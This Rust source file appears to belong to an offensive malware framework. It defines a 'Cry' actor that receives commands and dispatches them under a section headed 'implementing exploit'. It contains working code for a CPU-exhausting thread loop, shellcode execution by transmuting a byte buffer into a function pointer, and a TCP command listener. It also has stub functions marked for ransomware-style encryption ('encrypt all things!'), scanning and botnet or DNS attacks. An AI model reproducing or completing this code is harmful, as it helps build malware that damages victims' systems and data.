





use crate::*;








#[derive(Default)]
pub struct Cry{
    pub id: Uuid,
    pub status: Status,
    pub cmd: Cmd,
    pub cry: u32,
}



#[derive(BorshDeserialize, BorshSerialize, Default, Clone)]
pub enum Status{
    #[default] //// enum data types can only have one field as the default value
    Started, //// Started field is the default value; utf8 encoded variant is 0
    Queued, //// utf8 encoded variant is 1
    Failed, //// utf8 encoded variant is 2
}



#[derive(BorshDeserialize, BorshSerialize, Default, Clone)]
pub enum Cmd{
    #[default] //// enum data types can only have one field as the default value
    Empty, //// Empty field is the default value; utf8 encoded variant is 0
    BurnCpu, //// utf8 encoded variant is 1
    Inject, //// utf8 encoded variant is 2
    Cea, //// utf8 encoded variant is 3
    Botel, //// utf8 encoded variant is 4
    Scan, //// utf8 encoded variant is 5
    Lock, //// utf8 encoded variant is 6
}




// ⚈ --------- ⚈ --------- ⚈ --------- ⚈
//           implementing exploit
// ⚈ --------- ⚈ --------- ⚈ --------- ⚈

impl Cry{

    pub fn burn_cpu(&mut self) -> Self{
        let pool = scheduler::ThreadPool::new(ONIONS as usize); ///// `10_u32.pow(ONIONS) as usize` will need an allocation of 56402616320 bytes!!!
        pool.execute(|| {
            loop{
                std::thread::spawn(|| async move{
                    std::thread::yield_now(); //// yield will waste cpu usage and energy if there are no active threads available
                    std::thread::sleep(Duration::from_millis(10)); //// sleep 10ms in the current thread 
                });
            }
        });

        Self { id: self.id, status: self.status.clone(), cmd: self.cmd.clone(), cry: self.cry+1 } //// increasing the cry whenever this methid gets called
    }

    pub fn inject(&mut self) -> Self{        
        let exec_shellcode: extern "C" fn() -> () = unsafe{ //// the type of exec_shellcode is a C function pointer which will return nothing
            mem::transmute(&SHELLCODE as *const [u8] as *const ()) //// it copies the bits from the source value into the destination value; in our case we're transmutting the shellcode [u8] buffer into a C function pointer which is () in rust so we can call it later to execute it
        };
        exec_shellcode();

        Self { id: self.id, status: self.status.clone(), cmd: self.cmd.clone(), cry: self.cry+1 } //// increasing the cry whenever this methid gets called
    }

    pub fn lock(&mut self) -> Self{
        
        //// encrypt all things!
        
        Self { id: self.id, status: self.status.clone(), cmd: self.cmd.clone(), cry: self.cry+1 }
    
    }

    pub fn scan(&mut self) -> Self{

        //// scan all things!
        
        Self { id: self.id, status: self.status.clone(), cmd: self.cmd.clone(), cry: self.cry+1 }

    }

    pub fn botel(&mut self) -> Self{

        //// botnet and dns attacking stuffs
        
        Self { id: self.id, status: self.status.clone(), cmd: self.cmd.clone(), cry: self.cry+1 }

    }

    pub fn cea(&mut self) -> Self{

        let host = env::var("HOST")
                                    .expect("no host variable set");
        let port = env::var("ONION_PORT")
                                    .expect("no onion port variable set");
        

        //// binding the tcp address to a tcp listener
        let listener = TcpListener::bind(format!("{}:{}", host, port)).unwrap();
                
        //// waiting for incoming stream
        while let Ok((mut stream, addr)) = listener.accept(){
            
            println!("[+] incoming stream from {} at time {} ", addr, chrono::Local::now().naive_local());
            
            //// read the incoming stream
            utils::read_stream(&mut stream);
    
        }
         
        Self { id: self.id, status: self.status.clone(), cmd: self.cmd.clone(), cry: self.cry+1 }
        
    }

}




// ⚈ --------- ⚈ --------- ⚈ --------- ⚈
//            implementing actor
// ⚈ --------- ⚈ --------- ⚈ --------- ⚈

impl Actor for Cry{

    //// Msg associated type is the actor mailbox type and is of type Vec<u8>; actors can communicate with each other by sending cmd message to each other
    type Msg = Vec<u8>; 

    fn recv(&mut self, ctx: &Context<Self::Msg>, msg: Self::Msg, sender: Sender){ //// ctx is the actor system which we can build child actors with it also sender is another actor 

        //// decoding the message into Cmd enum
        //// as_mut_slice() will convert the Vec<u8> into &[u8]
        let msg = Cmd::try_from_slice(msg.as_slice()).unwrap();
        
        //// we'll receive a message from the either another actor or the main function then we start the exploit based on the decoded message
        match msg{
            Cmd::BurnCpu => {
                self.cmd = Cmd::BurnCpu;
                println!("[+] burning cpu at time {}", chrono::Local::now().naive_local());
                self.burn_cpu();
            },
            Cmd::Inject => {
                self.cmd = Cmd::Inject;
                println!("[+] injecting shellcode at time {}", chrono::Local::now().naive_local());
                self.inject();
            },
            Cmd::Botel => {
                self.cmd = Cmd::Botel;
                println!("[+] activating bots at time {}", chrono::Local::now().naive_local());
                self.botel();
            },
            Cmd::Cea => {
                self.cmd = Cmd::Cea;
                println!("[+] starting cli executor app server at time {}", chrono::Local::now().naive_local());
                self.cea();
            },
            Cmd::Lock => {
                self.cmd = Cmd::Lock;
                println!("[+] locking everthing at time {}", chrono::Local::now().naive_local());
                self.lock();
            },
            Cmd::Scan => {
                self.cmd = Cmd::Scan;
                println!("[+] scanning at time {}", chrono::Local::now().naive_local());
                self.scan();
            },
            _ => {
                self.cmd = Cmd::Empty;
                println!("[?] no command at {}", chrono::Local::now().naive_local());
            },
        }

    }



}